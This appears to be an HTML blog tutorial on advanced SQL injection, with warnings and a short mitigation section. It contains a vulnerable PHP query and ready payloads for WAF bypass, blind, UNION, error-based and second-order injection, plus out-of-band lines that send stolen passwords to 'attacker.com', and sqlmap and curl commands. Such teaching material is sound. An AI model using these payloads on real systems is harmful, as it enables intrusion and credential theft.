@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced SQL Injection Techniques - CyberSec Lab</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-primary: #58a6ff;
+            --accent-secondary: #1f6feb;
+            --border-color: #30363d;
+            --success: #3fb950;
+            --warning: #d29922;
+            --danger: #f85149;
+            --code-bg: #161b22;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f6f8fa;
+            --bg-tertiary: #eaeef2;
+            --text-primary: #24292f;
+            --text-secondary: #57606a;
+            --accent-primary: #0969da;
+            --accent-secondary: #0550ae;
+            --border-color: #d0d7de;
+            --success: #1a7f37;
+            --warning: #9a6700;
+            --danger: #cf222e;
+            --code-bg: #f6f8fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            transition: background 0.3s ease, color 0.3s ease;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .theme-toggle {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .theme-toggle:hover {
+            background: var(--bg-tertiary);
+            border-color: var(--accent-primary);
+        }
+
+        .post-header {
+            margin-bottom: 50px;
+        }
+
+        .post-category {
+            display: inline-block;
+            padding: 6px 14px;
+            background: var(--danger);
+            color: white;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .post-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .post-meta {
+            display: flex;
+            gap: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            padding-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .post-content {
+            font-size: 1.05rem;
+            line-height: 1.8;
+        }
+
+        .post-content h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+        }
+
+        .post-content ul, .post-content ol {
+            margin: 20px 0;
+            padding-left: 30px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+
+        .post-content code {
+            background: var(--code-bg);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: var(--accent-primary);
+        }
+
+        .post-content pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .post-content pre code {
+            background: transparent;
+            padding: 0;
+            color: var(--text-primary);
+            display: block;
+        }
+
+        .info-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-primary);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--warning);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .danger-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--danger);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .info-box h4, .warning-box h4, .danger-box h4 {
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+
+        footer {
+            margin-top: 80px;
+            padding-top: 30px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+
+            .post-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .post-content h3 {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-bar">
+            <a href="../index.html" class="back-link">← Back to Blog</a>
+            <button class="theme-toggle" onclick="toggleTheme()">
+                <span id="theme-icon">☀️</span>
+                <span id="theme-text">Light Mode</span>
+            </button>
+        </div>
+
+        <article>
+            <header class="post-header">
+                <span class="post-category">PENTEST</span>
+                <h1 class="post-title">Advanced SQL Injection Techniques</h1>
+                <div class="post-meta">
+                    <span>📅 December 15, 2025</span>
+                    <span>👤 By CyberSec Lab</span>
+                    <span>⏱️ 15 min read</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <p>SQL injection remains one of the most critical vulnerabilities in web applications. Despite being well-known for decades, it continues to affect modern applications. In this comprehensive guide, we'll explore advanced SQL injection techniques that can bypass modern security mechanisms.</p>
+
+                <h2>Understanding SQL Injection</h2>
+                <p>SQL injection occurs when user-controlled input is directly incorporated into SQL queries without proper sanitization. This allows attackers to manipulate the query logic and potentially gain unauthorized access to data.</p>
+
+                <div class="info-box">
+                    <h4>💡 Key Concept</h4>
+                    <p>The fundamental issue is the mixing of code and data. When user input is treated as code rather than data, injection vulnerabilities arise.</p>
+                </div>
+
+                <h3>Basic SQL Injection Example</h3>
+                <p>Consider this vulnerable PHP code:</p>
+
+                <pre><code>$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
+$result = mysqli_query($conn, $query);</code></pre>
+
+                <p>An attacker can inject: <code>' OR '1'='1</code> to bypass authentication.</p>
+
+                <h2>WAF Bypass Techniques</h2>
+                <p>Modern applications often deploy Web Application Firewalls (WAFs) to detect and block SQL injection attempts. Here are several bypass techniques:</p>
+
+                <h3>1. Case Manipulation</h3>
+                <pre><code>sElEcT * FrOm users
+UNION SELECT * FROM users</code></pre>
+
+                <h3>2. Comment Injection</h3>
+                <pre><code>UNION/**/SELECT/**/password/**/FROM/**/users
+UN/**/ION SE/**/LECT password FROM users</code></pre>
+
+                <h3>3. Encoding Techniques</h3>
+                <pre><code>-- URL Encoding
+%55%4E%49%4F%4E%20%53%45%4C%45%43%54
+
+-- Double URL Encoding
+%2555%254E%2549%254F%254E
+
+-- Unicode Encoding
+\u0055\u004E\u0049\u004F\u004E</code></pre>
+
+                <h2>Time-Based Blind SQL Injection</h2>
+                <p>When there's no visible output from the database, time-based techniques can be used to extract data bit by bit:</p>
+
+                <pre><code>-- MySQL
+' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
+
+-- PostgreSQL
+' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' 
+  THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+-- MSSQL
+'; IF (SELECT SUBSTRING(password,1,1) FROM users)='a' WAITFOR DELAY '00:00:05'--</code></pre>
+
+                <div class="warning-box">
+                    <h4>⚠️ Important Note</h4>
+                    <p>Time-based injection can be slow and may trigger rate limiting. Always use responsibly during authorized penetration tests.</p>
+                </div>
+
+                <h2>Advanced Data Exfiltration</h2>
+                <p>Once you've confirmed SQL injection, here are techniques to extract data efficiently:</p>
+
+                <h3>Using UNION Attacks</h3>
+                <pre><code>-- Determine number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+-- Extract data
+' UNION SELECT username,password,email FROM users--
+
+-- Extract from different databases
+' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--</code></pre>
+
+                <h3>Error-Based Extraction</h3>
+                <pre><code>-- MySQL
+' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--
+
+-- MSSQL
+' AND 1=CAST((SELECT password FROM users) as int)--</code></pre>
+
+                <h2>Second-Order SQL Injection</h2>
+                <p>This advanced technique exploits vulnerabilities where malicious input is stored and later used in a SQL query without sanitization:</p>
+
+                <ol>
+                    <li>Register a user with username: <code>admin'--</code></li>
+                    <li>When the application uses this username in another query without sanitization, injection occurs</li>
+                    <li>Example: Password reset functionality that uses stored username</li>
+                </ol>
+
+                <h2>Out-of-Band (OOB) Data Exfiltration</h2>
+                <p>When in-band techniques fail, OOB methods can extract data through DNS or HTTP requests:</p>
+
+                <pre><code>-- MySQL (requires FILE privilege)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--
+
+-- MSSQL
+'; DECLARE @q VARCHAR(1024); SET @q=(SELECT password FROM users); 
+EXEC('master..xp_dirtree "\\'+@q+'.attacker.com\share"')--</code></pre>
+
+                <div class="danger-box">
+                    <h4>⚠️ Legal Warning</h4>
+                    <p>These techniques should ONLY be used in authorized penetration testing engagements. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.</p>
+                </div>
+
+                <h2>Mitigation Strategies</h2>
+                <p>As security researchers, it's important to understand proper defenses:</p>
+
+                <ul>
+                    <li><strong>Parameterized Queries:</strong> Always use prepared statements with bound parameters</li>
+                    <li><strong>Input Validation:</strong> Whitelist acceptable input patterns</li>
+                    <li><strong>Least Privilege:</strong> Database users should have minimal necessary permissions</li>
+                    <li><strong>WAF Deployment:</strong> Use as defense-in-depth, not sole protection</li>
+                    <li><strong>Error Handling:</strong> Don't expose database errors to users</li>
+                </ul>
+
+                <h2>Tools for SQL Injection Testing</h2>
+                <pre><code># SQLMap - Automated SQL injection tool
+sqlmap -u "http://target.com/page?id=1" --batch --dbs
+
+# Manual testing with curl
+curl "http://target.com/page?id=1' OR '1'='1"
+
+# Burp Suite Intruder
+# Configure payload positions and use SQL injection payloads</code></pre>
+
+                <h2>Conclusion</h2>
+                <p>SQL injection remains a critical vulnerability that requires constant vigilance. Modern applications must implement defense-in-depth strategies including parameterized queries, input validation, and proper error handling. As penetration testers, understanding these advanced techniques helps identify and remediate vulnerabilities before malicious actors can exploit them.</p>
+
+                <p>Stay tuned for more advanced security research and penetration testing techniques!</p>
+            </div>
+        </article>
+
+        <footer>
+            <p>© 2025 CyberSec Research Lab. All research for educational purposes only.</p>
+        </footer>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            const html = document.documentElement;
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            const currentTheme = html.getAttribute('data-theme');
+            
+            if (currentTheme === 'light') {
+                html.removeAttribute('data-theme');
+                themeIcon.textContent = '☀️';
+                themeText.textContent = 'Light Mode';
+                localStorage.setItem('theme', 'dark');
+            } else {
+                html.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('theme');
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            
+            if (savedTheme === 'light') {
+                document.documentElement.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+            }
+        });
+    </script>
+</body>
+</html>
